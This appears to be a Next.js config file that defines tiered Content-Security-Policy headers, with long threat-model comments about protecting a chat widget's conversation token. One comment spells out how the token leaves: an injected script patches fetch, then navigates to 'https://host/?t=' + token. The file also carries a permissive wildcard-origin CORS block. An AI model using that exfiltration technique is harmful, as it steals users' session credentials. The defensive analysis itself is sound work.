// ---------------------------------------------------------------------------
// Content-Security-Policy
//
// CORRECTED 2026-09-25. These comments used to say the conversation credential
// the NEXUS widget uses lives in `sessionStorage`. It no longer does, and had
// not by the time this file was last read: the widget holds it in a closure
// (`const readConv = () => conversation` in public/index.html), which an
// independent reviewer confirmed in a live browser — nothing in sessionStorage,
// localStorage, cookies, window.name, IndexedDB, the Cache API, the DOM or any
// global. The credential is MEMORY-ONLY and dies with the document.
//
// That changes the threat model this policy answers, and it does not retire it.
// A script that executes ON THE PAGE, in the same document, can still read a
// closure variable indirectly — by patching `fetch` and reading the header the
// widget sends, or by driving the widget's own UI — so an injected third-party
// tag is still the exposure, and a policy that stops one from getting onto the
// page at all is still the compensating control. What the memory-only credential
// DID remove is the cross-page reach: a script on another same-origin page can
// no longer find a previous conversation's credential in storage after the
// visitor navigates. Until this file gained a CSP there was no
// Content-Security-Policy anywhere in this repository.
//
// This is defence in depth. It does not replace server-side revocation and
// session binding; those are the controls that make a stolen token useless, and
// they are being implemented in the NEXUS core. A CSP only narrows who can read
// the token in the first place.
//
// Where: here, in next.config.js, and deliberately not in vercel.json. Next
// compiles these rules into routes-manifest.json, which Vercel applies ahead of
// the filesystem handler, so they reach `public/` files and rewrite
// destinations alike - and `next dev` and `next start` serve the same header, so
// a local browser check is evidence about production. vercel.json would be a
// second source of truth: both files' headers are applied, so two CSP headers
// would be enforced as their intersection, and a one-sided edit would silently
// tighten the effective policy. Its CORS block is left exactly as it was.
//
// script-src and style-src carry 'unsafe-inline', and that is a real weakening
// worth naming. public/index.html is a static file with five inline <script>
// blocks and five inline <style> blocks. A nonce cannot reach them: the file is
// served as bytes, not rendered per request, and a header value here is a
// constant. Hashes could, but the page is hand- and script-edited constantly,
// and a stale hash does not degrade - it stops the widget dead in production.
//
// So inline code is permitted, and what the policy still buys has to be stated
// accurately rather than generously. It buys one thing: no script may be LOADED
// from another origin, which is the realistic path for an injected third-party
// tag. It does NOT prevent exfiltration of the conversation token. With
// 'unsafe-inline', an injection that arrives as markup executes in the same
// document as the widget, reaches the token (memory-only is not out of reach
// from inside the page: patching `fetch` reads the header the widget sends), and
// leaves by top-level navigation - `location = 'https://host/?t=' + token`, a
// window.open, an <a> the script clicks. No enforceable directive
// governs that: `navigate-to` was specified and never shipped, form-action
// covers only form submissions, and connect-src covers only the programmatic
// channels (fetch, XMLHttpRequest, WebSocket, EventSource, sendBeacon). So
// connect-src 'self' narrows the exfiltration channels; it does not close them.
// What makes a leaked token useless is server-side: the conversation is bound to
// the HttpOnly session, the credential is single-use and rotates, and a reset
// deletes and tombstones the record. The policy is defence in depth for the
// window before those act, not a substitute for them.
const HOMEPAGE_CSP = [
  // Nothing loads from anywhere but this origin unless a directive below says so.
  "default-src 'self'",
  // No injected <base> may re-point every relative URL on the page.
  "base-uri 'self'",
  // No <object>/<embed>/<applet>; there are none in public/.
  "object-src 'none'",
  // Nothing may frame this page. Verified: no iframe, object or embed anywhere
  // in public/, and no X-Frame-Options allowance was being relied on.
  "frame-ancestors 'none'",
  // ...and the page frames nothing itself.
  "frame-src 'none'",
  // The only form is the NEXUS composer, which submits through fetch to this origin.
  "form-action 'self'",
  // The chat proxy at /api/nexus/chat is same-origin, so a script that runs here
  // cannot fetch, XHR, WebSocket, EventSource or sendBeacon the conversation
  // token to another host. It can still carry it out by navigating - see the
  // note above; this directive governs programmatic requests only.
  "connect-src 'self'",
  // 'unsafe-inline' relaxation - see the note above. No wildcard: an injected
  // <script src> pointing off-origin is still refused.
  "script-src 'self' 'unsafe-inline'",
  // 'unsafe-inline' relaxation - the same five inline <style> blocks, plus the
  // style="" attributes the panel uses for its type-scale overrides.
  "style-src 'self' 'unsafe-inline'",
  // data: is required: the hero's grain texture is an inline SVG data URI in CSS.
  "img-src 'self' data:",
  // Measured in Chrome: the page requests no webfont. fonts.googleapis.com and
  // fonts.gstatic.com appear only as rel=preconnect hints, which CSP does not
  // govern, so nothing needs to be allowed for them.
  "font-src 'self'",
  "media-src 'self'",
  "worker-src 'self'",
  "manifest-src 'self'",
  'upgrade-insecure-requests'
].join('; ');

// The four pages reachable through the rewrites below are older builds that
// genuinely load their libraries and data from public CDNs and from a separate
// API host. Breaking them would be worse than leaving them uncovered, so they
// get the same skeleton with exactly the origins they actually use - enumerated
// hosts, never a wildcard - and the framing, base-uri and object-src
// protections that cost them nothing are identical to the homepage's.
//
// This allowlist is empirical, not merely grepped. Reading the markup alone was
// not enough: these pages load local scripts that reach further at runtime, and
// the first Chrome run under an earlier, tighter policy caught three of them
// (an esm.sh dynamic import, an api.barriosa2i.com fetch and an SSE stream).
// Every host below was traced to the code that uses it, and every page was then
// loaded in Chrome and confirmed to raise no violation. That is a measurement,
// so if some interaction-gated path was missed, the fix is to add its host here
// - or to drop these paths from LEGACY_PAGE_PATHS, which restores the previous
// behaviour exactly.
const LEGACY_PAGE_CSP = [
  "default-src 'self'",
  "base-uri 'self'",
  "object-src 'none'",
  "frame-ancestors 'none'",
  "frame-src 'none'",
  // The lead-capture form on /nexus-personal posts to Formspree; the enhanced
  // path intercepts it with fetch, but the native POST must still work if that
  // script does not run.
  "form-action 'self' https://formspree.io",
  // Iconify fetches icon data over XHR from its own API hosts. The NEXUS/Genesis
  // demos on /creative-director fetch and open SSE streams against the separate
  // API host and the gateway; the Formspree endpoint is the fetch above.
  "connect-src 'self' https://api.iconify.design https://api.simplesvg.com https://api.unisvg.com https://api.barriosa2i.com https://barrios-api-gateway.onrender.com https://formspree.io",
  // iconify (nexus-personal, creative-director, founder), GSAP and three.js via
  // cdnjs (creative-director, command-center), lucide via unpkg
  // (creative-director, command-center), the Tailwind Play CDN (founder), and
  // React/ReactDOM/framer-motion dynamically imported from esm.sh by
  // js/agent-visuals-integration.js on /creative-director.
  "script-src 'self' 'unsafe-inline' https://code.iconify.design https://cdnjs.cloudflare.com https://unpkg.com https://cdn.tailwindcss.com https://esm.sh",
  // Google Fonts stylesheets, which these four do load, unlike the homepage.
  "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
  "font-src 'self' https://fonts.gstatic.com",
  "img-src 'self' data:",
  "media-src 'self'",
  "worker-src 'self'",
  "manifest-src 'self'",
  'upgrade-insecure-requests'
].join('; ');

// Every other static page in public/ - and there are about twenty-five of them,
// including /privacy-directive.html and /contact.html, which the assistant panel
// itself links to.
//
// This tier exists because an enumerated list of paths was never coverage. The
// original reason was that the credential lived in `sessionStorage`, which is
// scoped to the ORIGIN and the tab rather than to a page, so it survived a
// same-tab navigation and a visitor who chatted and then clicked "Privacy"
// inside the panel carried a live token onto that page. That specific reach is
// GONE: the credential is memory-only and does not survive the navigation. The
// coverage is still right, for reasons that did not change - every page on this
// origin can reach /api/nexus/* as the visitor, the panel links out to pages in
// this tier, and several of them still load unpinned third-party scripts, so an
// injection there is the realistic supply-chain path onto this origin.
//
// The allowlist is the measured union of what those pages actually load, scanned
// from their markup and from the local scripts they pull in - the same method the
// legacy tier used, and pinned by a test that recomputes it. Enumerated hosts,
// never a wildcard. Several of the entries exist only for leftover duplicate
// pages (index.new.html, *-original.html, *-backup.html); deleting those pages
// would let this list shrink.
const STATIC_PAGE_CSP = [
  "default-src 'self'",
  "base-uri 'self'",
  "object-src 'none'",
  "frame-ancestors 'none'",
  // Verified: not one <iframe>, <object> or <embed> in any of these pages.
  "frame-src 'none'",
  // No page has a cross-origin form action; formspree.io is the endpoint
  // js/config.js names, and is allowed for the native POST as well as the fetch.
  "form-action 'self' https://formspree.io",
  // Iconify fetches its icon data over XHR from its own API hosts.
  // js/lead-capture.js (contact.html, intake.html) posts to the gateway;
  // js/nexus-chat.js and js/nexus-panel.js (index.new.html) reach the separate
  // API host; js/config.js names the Formspree endpoint.
  "connect-src 'self' https://api.iconify.design https://api.simplesvg.com https://api.unisvg.com https://api.barriosa2i.com https://barrios-api-gateway.onrender.com https://formspree.io",
  // iconify almost everywhere, jsdelivr on index.new.html / intelligence-stack /
  // status / nexus-personal-original, unpkg on order-success.
  "script-src 'self' 'unsafe-inline' https://code.iconify.design https://cdn.jsdelivr.net https://unpkg.com",
  "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
  "font-src 'self' https://fonts.gstatic.com",
  // data: for inline SVG textures; the one remote image is index.new.html's
  // noise.svg background.
  "img-src 'self' data: https://grainy-gradients.vercel.app",
  // neural-lattice-section.html is a leftover partial whose <source> still points
  // at an old preview deployment. Enumerated rather than wildcarded, and it can
  // only ever load media.
  "media-src 'self' https://barrios-a2i-website-yvh6.vercel.app",
  "worker-src 'self'",
  "manifest-src 'self'",
  'upgrade-insecure-requests'
].join('; ');

// The floor, for everything that is left: every Next.js route (/dashboard,
// /sign-in, /mulligan/...), every API route, every build asset, and every path
// that does not exist at all - a 404 is still a page on this origin.
//
// It deliberately carries no default-src, script-src, style-src or connect-src.
// That is not an oversight and it must not be quietly "tightened" later without
// a browser measurement. This half of the origin genuinely loads third-party
// code that was never measured here: @clerk/nextjs hot-loads clerk.browser.js
// from a Frontend API host that exists only in an environment variable and talks
// to it over XHR, and public/checkout.html loads Stripe.js, which inserts its own
// controller iframe and calls several stripe.com hosts. Shipping an unmeasured
// default-src 'self' across the whole origin would break authentication and
// checkout in production, which is a worse outcome than the residual it closes.
//
// What is here is every directive that cannot break a page which loads
// third-party code, and each one is a real control: no injected <base> may
// re-point the page's relative URLs, no plugin content may run, nothing may frame
// this origin, and no injected form may POST off-origin.
const BASELINE_CSP = [
  "base-uri 'self'",
  "object-src 'none'",
  "frame-ancestors 'none'",
  "form-action 'self' https://formspree.io",
  'upgrade-insecure-requests'
].join('; ');

// A rewrite does not change which header rule matches: Next evaluates headers
// against the incoming path. Both spellings are listed so the policy reaches the
// page whether it is requested as /founder or as /founder.html.
const LEGACY_PAGE_PATHS = [
  '/nexus-personal',
  '/nexus-personal.html',
  '/creative-director',
  '/creative-director.html',
  '/founder',
  '/founder.html',
  '/command-center',
  '/command-center.html'
];

const HOMEPAGE_PATHS = ['/', '/index.html'];

// The one static page that loads Stripe.js. Stripe requires script-src, frame-src
// and connect-src entries across several of its hosts and inserts a controller
// iframe on load; none of that was measured in a browser here, and a partial
// allowlist fails silently rather than loudly. So this page takes the floor, by
// name, instead of a guessed policy on a payment page. Named as a residual: the
// follow-up is to load it in Chrome, record the hosts it really uses, and move it
// into the static tier.
const FLOOR_ONLY_PAGE_PATHS = ['/checkout.html'];

// PRECEDENCE. Next applies EVERY matching headers() entry, and two
// Content-Security-Policy headers are enforced by browsers as their
// INTERSECTION - so a second, apparently looser rule can silently kill a page.
// Rather than depend on which of two matching rules is applied last (Next's dev
// and start servers setHeader, so the last wins; Vercel's routing layer is a
// different implementation), the five CSP sources below are written to be
// MUTUALLY EXCLUSIVE. Exactly one matches any path, so order in headers() is
// irrelevant to correctness and no page can ever receive two policies. A test
// asserts that one-rule property path by path, and a served response is read off
// the wire to confirm one header line.
//
// The two catch-alls use the same `:name(regex)` form the pre-existing CORS
// carve-out uses.
//
// Every exclusion is anchored `/?$`, not `$`, and that detail is load-bearing.
// Next compiles a header source with an optional trailing slash - the built
// .next/routes-manifest.json shows `^/founder(?:/)?$` - so `/founder/` matches the
// rule written `/founder`. With a bare `$` the catch-all's own exclusion missed
// the slashed spelling, and `/founder/` picked up TWO Content-Security-Policy
// headers, which a browser enforces as their intersection. Verified against Next's
// own compiled regexes, not against a re-implementation of its matcher.
const escapeLiteral = (value) => value.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
const notOneOf = (paths) =>
  `(?!${paths.map((path) => `${escapeLiteral(path.replace(/^\//, ''))}/?$`).join('|')})`;

// Every *.html path except the ones that carry their own policy above.
const STATIC_PAGE_SOURCE = `/:page(${notOneOf([
  ...HOMEPAGE_PATHS.filter((path) => path !== '/'),
  ...LEGACY_PAGE_PATHS.filter((path) => path.endsWith('.html')),
  ...FLOOR_ONLY_PAGE_PATHS
])}.*\\.html)`;

// Everything else: not any *.html (all of which are covered above), not the four
// extensionless rewrite spellings, and not the root - `.+` rules out an empty
// parameter and `(?!/?$)` rules out the `//` spelling of it, both of which the
// homepage rule owns.
const BASELINE_SOURCE = `/:path(${notOneOf(
  LEGACY_PAGE_PATHS.filter((path) => !path.endsWith('.html'))
)}(?!/?$)(?!.*\\.html/?$).+)`;

/** @type {import('next').NextConfig} */
const nextConfig = {
  serverExternalPackages: ['@prisma/client'],
  async rewrites() {
    return [
      { source: '/nexus-personal', destination: '/nexus-personal.html' },
      { source: '/creative-director', destination: '/creative-director.html' },
      { source: '/founder', destination: '/founder.html' },
      { source: '/command-center', destination: '/command-center.html' },
    ];
  },
  images: {
    remotePatterns: [
      {
        protocol: 'https',
        hostname: 'img.clerk.com',
      },
      {
        protocol: 'https',
        hostname: '*.supabase.co',
      },
    ],
  },
  async headers() {
    return [
      // Five CSP tiers with mutually exclusive sources - see the PRECEDENCE note
      // above. Exactly one of them matches any path on this origin, so no request
      // is ever matched by two policies and the order of these entries does not
      // affect which policy a page gets.
      //
      // The homepage, under both the spellings Next serves it as.
      ...HOMEPAGE_PATHS.map((source) => ({
        source,
        headers: [{ key: 'Content-Security-Policy', value: HOMEPAGE_CSP }],
      })),
      ...LEGACY_PAGE_PATHS.map((source) => ({
        source,
        headers: [{ key: 'Content-Security-Policy', value: LEGACY_PAGE_CSP }],
      })),
      ...FLOOR_ONLY_PAGE_PATHS.map((source) => ({
        source,
        headers: [{ key: 'Content-Security-Policy', value: BASELINE_CSP }],
      })),
      {
        source: STATIC_PAGE_SOURCE,
        headers: [{ key: 'Content-Security-Policy', value: STATIC_PAGE_CSP }],
      },
      {
        source: BASELINE_SOURCE,
        headers: [{ key: 'Content-Security-Policy', value: BASELINE_CSP }],
      },
      {
        source: '/api/:path((?!nexus/).*)',
        headers: [
          { key: 'Access-Control-Allow-Credentials', value: 'true' },
          { key: 'Access-Control-Allow-Origin', value: '*' },
          { key: 'Access-Control-Allow-Methods', value: 'GET,DELETE,PATCH,POST,PUT' },
          { key: 'Access-Control-Allow-Headers', value: 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version, X-Account-Id' },
        ],
      },
    ];
  },
};

module.exports = nextConfig;
